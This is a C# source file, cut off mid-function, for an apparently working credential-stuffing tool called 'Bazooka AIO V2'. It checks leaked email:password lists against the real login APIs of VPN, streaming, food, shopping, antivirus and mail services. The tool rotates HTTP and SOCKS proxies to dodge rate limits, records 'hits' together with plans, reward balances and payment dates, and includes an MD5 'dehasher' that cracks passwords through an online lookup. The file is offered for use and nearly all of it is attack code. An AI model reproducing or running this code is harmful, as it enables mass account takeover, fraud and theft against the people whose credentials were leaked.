using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;
using System.Windows.Forms;
using Colorful;
using xNet;

namespace TPS
{
	public class Program
	{
		public static Variables var = new Variables();

		public static data Combos = new data();

		public static bool ShowFails;

		[STAThread]
		private static void Main(string[] args)
		{
			PrintLogo();
			System.Console.WriteLine("");
			Colorful.Console.WriteLine("Connecting to the Bazooka servers...", Color.BlueViolet);
			nod.Config(new configuration(useProxy: true, "BazookaAIO V2", "Freeload24 and Blaschuko"));
			System.Console.Title = configuration.nameChecker + " | Menu";
			OnProgramStart.Initialize("Bazooka AIO V2", "728796", "imuuDJaAufW9zfxMtwpIxAaNGUQJbXwxu82", "1.0");
			if (!ApplicationSettings.Status)
			{
				System.Windows.MessageBox.Show("TPS AIO isn't avaible right now, please contact support!", OnProgramStart.Name, MessageBoxButton.OK, MessageBoxImage.Hand);
				Process.GetCurrentProcess().Kill();
			}
			System.Console.WriteLine("");
			Colorful.Console.WriteLine("Successfully connected to the Bazooka servers", Color.BlueViolet);
			Thread.Sleep(1000);
			System.Console.Clear();
			if (AskLogin())
			{
				System.Windows.Forms.MethodInvoker method = Menu();
				Checker.Init();
				Checker.Start(method);
				System.Console.ReadLine();
			}
		}

		public static void myMethod()
		{
			System.Console.WriteLine("hello");
		}

		private static System.Windows.Forms.MethodInvoker Menu()
		{
		
			System.Console.Clear();
			PrintLogo();
			System.Console.WriteLine("");
			while (true)
			{
				System.Console.Clear();
				PrintLogo();
				Colorful.Console.WriteLine("Select a category:\n    ≫ [1] Gaming\n    ≫ [2] Streaming\n    ≫ [3] Food\n    ≫ [4] Vpn\n    ≫ [5] Shopping\n    ≫ [6] Antivirus\n    ≫ [7] Misc");
				switch (System.Console.ReadLine())
				{
				default:
					Colorful.Console.WriteLine("Please select a valid option!", Color.Red);
					break;
				case "7":
				{
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine("TIP: If you want to go back, send a random letter/number!\nPlease chose a module:\n    ≫ [1] Mail Access\n    ≫ [2] MD5 Dehasher\n");
					string a = System.Console.ReadLine();
					if (!(a == "1"))
					{
						if (a == "2")
						{
							return startDehasher;
						}
						break;
					}
					return startMailaccess;
				}
				case "4":
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine("TIP: If you want to go back, send a random letter/number!\nPlease chose a module:\n    ≫ [1] NordVPN\n    ≫ [2] HMA\n    ≫ [3] Tunnel Bear\n    ≫ [4] IPVanish\n    ≫ [5] Vypr\n    ≫ [6] TigerVPN");
					switch (System.Console.ReadLine())
					{
					case "1":
						return startNord;
					case "2":
						return startHma;
					case "3":
						return startTunnelBear;
					case "4":
						return startIpVanish;
					case "5":
						return startVypr;
					case "6":
						return startTiger;
					}
					break;
				case "5":
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine("TIP: If you want to go back, send a random letter/number!\nPlease chose a module:\n    ≫ [1] Wish [disabled]\n    ≫ [2] Forever21\n    ≫ [3] Chegg\n    ≫ [4] Godaddy\n    ≫ [5] Walmart\n    ≫ [6] Fuel Rewards\n");
					switch (System.Console.ReadLine())
					{
					case "1":
						return startWish;
					case "2":
						return startForever21;
					case "3":
						return startChegg;
					case "4":
						return startGodaddy;
					case "5":
						return startWalmart;
					case "6":
						return startFuelRewards;
					}
					break;
				case "1":
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine("TIP: If you want to go back, send a random letter/number!\nPlease chose a module:\n    ≫ [1] Origin\n    ≫ [2] Uplay\n    ≫ [3] Minecraft\n    ≫ [4] Gameforge\n    ≫ [5] LOL EUW\n    ≫ [6] LOL NA\n    ≫ [7] Valorant");
					switch (System.Console.ReadLine())
					{
					case "1":
						return startOrigin;
					case "2":
						return startUplay;
					case "3":
						return startMinecraft;
					case "4":
						return startGameForge;
					case "5":
						return startLolEUW;
					case "6":
						return startLolNA;
					case "7":
						return startValorant;
					}
					break;
				case "6":
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine("TIP: If you want to go back, send a random letter/number!\nPlease chose a module:\n    ≫ [1] Avaria\n    ≫ [2] Bitdefender\n    ≫ [3] Kasparsky\n");
					switch (System.Console.ReadLine())
					{
					case "1":
						return startAvaria;
					case "2":
						return startBitdefender;
					case "3":
						return startKasparsky;
					}
					break;
				case "2":
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine("TIP: If you want to go back, send a random letter/number!\nPlease chose a module:\n    ≫ [1] Hulu\n    ≫ [2] Disney +\n    ≫ [3] Funimation\n    ≫ [4] Pornhub\n    ≫ [5] Napster\n    ≫ [6] WWE\n    ≫ [7] EpixNow\n    ≫ [8] DC Universe\n    ≫ [9] Plex");
					switch (System.Console.ReadLine())
					{
					case "1":
						return startHulu;
					case "2":
						return startDisney;
					case "3":
						return startFunimation;
					case "4":
						return startPornhub;
					case "5":
						return startNapster;
					case "6":
						return startWwe;
					case "7":
						return startEpixNow;
					case "8":
						return startDC;
					case "9":
						return startPlex;
					}
					break;
				case "3":
					System.Console.Clear();
					PrintLogo();
					System.Console.WriteLine("TIP: If you want to go back, send a random letter/number!\nPlease chose a module:\n    ≫ [1] Domino's US\n    ≫ [2] BWW\n    ≫ [3] Doordash\n    ≫ [4] KFC USA\n    ≫ [5] ShakeShack\n    ≫ [6] Wendy's");
					switch (System.Console.ReadLine())
					{
					case "1":
						return startDomino;
					case "2":
						return startBww;
					case "3":
						return startDoordash;
					case "4":
						return startKfc;
					case "5":
						return startShakeShack;
					case "6":
						return startWendy;
					}
					break;
				}
			}
		}

		public static void startTiger()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
				httpRequest.AddHeader("Origin", "https://login.live.com");
				httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
				httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
				httpRequest.AddHeader("Sec-Fetch-User", "?1");
				httpRequest.AddHeader("Sec-Fetch-Dest", "document");
				httpRequest.AddHeader("Referer", "https://login.live.com/oauth20_authorize.srf?client_id=000000004422D612&scope=XboxLive.signin&response_type=code&redirect_uri=https%3A%2F%2Fconnect.ubisoft.com%2Fxbox-callback&locale=en-US");
				httpRequest.AddHeader("Cookie", "MSPRequ=id=N&lt=1593935742&co=1; uaid=ae4fa14326b84eab932663375d52a64d; MSCC=192.13.92.188-US; OParams=11DVSKzhni4*lb4*eKvAWoHR8anpISSrLIg4q6JvQ1vOMUFmmmovm8RraUyeMdwvzqMkdW*9*!nTABdDwqhTgjKO7U1mwjQXjgDdenug3HAxzvnpulryM!8HBpanUBxTv8L9au4kNyORXTrNgHDpJ5Nfn9RWwwxbAowJ0cKinQHMjSq0k9W!pnRF9L4zkVo3hLELZRohMttvm0DayDdiV4BwEIIqLQg!YoapPcpeisjAs8eRNS1jBTQjgkXUAiPhUkCPHdKKxfhvJ5502sFR19WRy*47*hIoBM1X084nluAw9bHDsB!d32yb890F3*XR5NEHhp6IdqefMVpGLVaEZlTQxuCrMmMfqtVBnhCINO7vgLdQ4LnKFPCzVki73lKq8wTGuhGMrOqbOIROwWRQQbJY2l57vu81g3Tkp1USJEynkf; MSPOK=$uuid-86f422d6-ffff-415d-9e0f-124e5653e8cb$uuid-3bb22eae-af69-48b0-bdcd-b301399864c6; wlidperf=FR=L&ST=1593935748985");
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AllowAutoRedirect = true;
				string str = "email=" + text + "&password=" + text2;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://www.tigervpn.com/api/v3/auth/login.json", str, "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("status\":\"success"))
				{
					Colorful.Console.WriteLine("[HIT] " + text3, Color.Green);
					Combos.Results(text3, "Hits", "TigerVPN");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text5.Contains(""))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("429 Too Many Requests"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("vpn_enabled\":false"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
					Combos.Results(text3, "Free", "TigerVPN");
				}
				else if (text5.Contains("is_trial\":true"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
					Combos.Results(text3, "Free", "TigerVPN");
				}
			}
		}

		public static void startPlex()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				string str = Guid.NewGuid().ToString();
				httpRequest.AddHeader("Accept", "application/json");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20SSO&X-Plex-Client-Identifier=" + str, "login=" + text + "&password=" + text2 + "&rememberMe=true", "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("status\":\"Active"))
				{
					string text6 = Parse(text5, "\"plan\":\"", "\",");
					Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = " + text6, Color.Green);
					Combos.Results(text3 + " Plan = " + text6, "Hits", "Plex");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text5.Contains("code\":1001"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("status\":\"Inactive"))
				{
					Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
					Combos.Results(text3, "Free", "Plex");
					Variables.Fails++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text5.Contains("code\":1031"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("code\":1003"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startFuelRewards()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("tags", "[{\"deviceType\":\"and\",\"deviceModeType\":\"cons\",\"deviceOSVer\":\"5.1.1\",\"DeviceID\":\"SM-N950N\"}]");
				httpRequest.AddHeader("access_token", "d23df8e7-1a95-45c3-add3-118316e72ced");
				httpRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)";
				string str = "{\"userId\":\"" + text + "\",\"password\":\"" + text2 + "\"}";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/login", str, "application/json").ToString();
				if (text5.Contains("TIER"))
				{
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					string text6 = Parse(text5, "rewardBalance\":", ",");
					string text7 = Parse(text5, "memberId\":\"", "\"");
					Colorful.Console.WriteLine("[GOOD] " + text3 + " Reward Balance = " + text6 + " Member ID = " + text7, Color.Green);
					Combos.Results(text3, "Hits", "Fuel Rewards");
				}
				else if (text5.Contains("Connection: close"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("User name or password not recognized"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startDC()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AddHeader("x-consumer-key", "DA59dtVXYLxajktV");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://www.dcuniverse.com/api/users/login", "{\"username\":\"" + text + "\",\"password\":\"" + text2 + "\"}", "application/json").ToString();
				if (text5.Contains("session_id"))
				{
					string str = Parse(text5, "\"session_id\": \"", "\",");
					httpRequest.AddHeader("x-consumer-key", "DA59dtVXYLxajktV");
					httpRequest.AddHeader("authorization", "Token " + str);
					string text6 = httpRequest.Get("https://www.dcuniverse.com/api/premium/2/subscriptions").ToString();
					if (text6.Contains("active\": false"))
					{
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						Variables.Fails++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
					else if (text6.Contains("active\": true"))
					{
						string text7 = Parse(text6, "\"premium_next_pay_date\": \"", "\",");
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Next Pay Date = " + text7, Color.Green);
						Combos.Results(text3 + " Next Pay Date = " + text7, "Hits", "DC Universe");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
				}
				else if (text5.Contains("The email address or password is incorrect. Please try again"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("406 Not Acceptable"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("SORRY, THIS SERVICE IS ONLY AVAILABLE IN THE US. WE'LL ANNOUNCE WHEN IT IS AVAILABLE IN YOUR REGION."))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startDehasher()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Get("https://bluecode.info/md5api/?search%5B%5D=" + text2 + "&").ToString();
				if (text5.Contains("false,\""))
				{
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					string text6 = Parse(text5, text2 + "\":\"", "\"}");
					Colorful.Console.WriteLine("[GOOD] " + text + ":" + text6, Color.Green);
					Combos.Results(text + text6, "Hits", "Dehasher");
				}
				else if (text5.Contains("Connection: close"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("SA"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Combos.Results(text3, "Bads", "Dehasher");
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("{\"ok\":true,\"private\":false}"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startMailaccess()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
				_ = "user_email=" + text + "&password=" + text2 + "&serial_number=98ded0155cef8123&friendly_name=Android%20-%20samsung%20SM-G930L%20samsung&mobile_capabilities=telephony&additional_properties=%7B%22distro%22%3A%22google%22%2C%22device_platform%22%3A%22Android%22%2C%22device_type%22%3A%22Tablet%22%2C%22app_version%22%3A%224.0.0%22%2C%22device_family%22%3A%22Android%22%2C%22build_number%22%3A%22408770%22%2C%22device_os%22%3A%22Android%20REL5.1.1%22%2C%22device_manufacturer%22%3A%22samsung%22%2C%22device_product%22%3A%22Android%20REL5.1.1%22%2C%22device_model%22%3A%22SM-G930L%22%2C%22device_capabilities%22%3A%7B%22device%22%3A%7B%22hulu%3Aapp%3Aandroid%22%3A%224.0.0%22%2C%22hulu%3Aplatform%3Aandroid%3Agoogleplay%22%3A%2222%22%2C%22hulu%3Adevices%3Asamsung%3Asmg930l%22%3A%22%22%7D%7D%7D&device_id=166&time_zone=Asia%2FTehran&screen_size=%7B%22width_pixels%22%3A960%2C%22height_pixels%22%3A540%2C%22width_pixel_density_in_inches%22%3A160%2C%22height_pixel_density_in_inches%22%3A160%7D";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Get("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOSÂ¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + text + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=" + text2 + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&").ToString();
				if (text5.Contains("[\"AjaxResponse\", \"OK\", \"Ok=1"))
				{
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					Combos.Results(text3, "Hits", "Mail Access");
				}
				else if (text5.Contains("Connection: close"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("[\"AjaxResponse\", \"OK\", \"Ok=0"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startKasparsky()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				httpRequest.Get("https://my.kaspersky.com").ToString();
				string source = httpRequest.Post("https://hq.uis.kaspersky.com/v3/logon/start", "{\"Realm\":\"https://center.kaspersky.com/\"}", "application/json").ToString();
				string text5 = Parse(source, "\"LogonContext\":\"", "\"");
				string text6 = httpRequest.Post("https://hq.uis.kaspersky.com/v3/logon/proceed", "{\"logonContext\":\"" + text5 + "\",\"login\":\"" + text + "\",\"password\":\"" + text2 + "\",\"locale\":\"en\",\"captchaType\":\"invisible_recaptcha\",\"captchaAnswer\":\"undefined\"}", "application/json").ToString();
				if (text6.Contains("Success"))
				{
					System.Console.ForegroundColor = ConsoleColor.Green;
					System.Console.WriteLine("[GOOD] " + text3);
					Checker.Increment_CPM++;
					Variables.Hits++;
					Variables.Progress++;
					Combos.Results(text3, "Hits", "Kaspassky");
				}
				else if (text6.Contains("{\"Status\":\"InvalidRegistrationData\"}"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text6.Contains("InvalidCaptchaAnswer"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startBitdefender()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
